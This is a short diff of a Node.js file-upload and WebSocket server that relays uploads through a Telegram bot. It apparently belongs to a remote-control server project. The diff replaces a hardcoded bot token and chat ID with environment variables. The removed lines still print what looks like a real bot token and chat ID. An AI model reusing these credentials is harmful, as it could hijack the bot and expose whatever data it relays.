@@ -1,3 +1,4 @@
+require('dotenv').config()
 const express = require('express')
 const webSocket = require('ws')
 const http = require('http')
@@ -6,9 +7,10 @@ const uuid4 = require('uuid')
 const multer = require('multer')
 const bodyParser = require('body-parser')
 const axios = require('axios')
+const { BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env
 
-const token = '6063686195:AAEmDXqu8b2W36hrUfMyhfywdpzRK5Fu1y0'
-const id = '1771500478'
+const token = BOT_TOKEN
+const id = TELEGRAM_CHAT_ID
 const address = 'https://www.google.com'
 
 const app = express()
@@ -25,7 +27,7 @@ let currentNumber = ''
 let currentTitle = ''
 
 app.get('/', function (req, res) {
-  res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
+  res.json({ status: 'server is running' })
 })
 
 app.post('/uploadFile', upload.single('file'), (req, res) => {
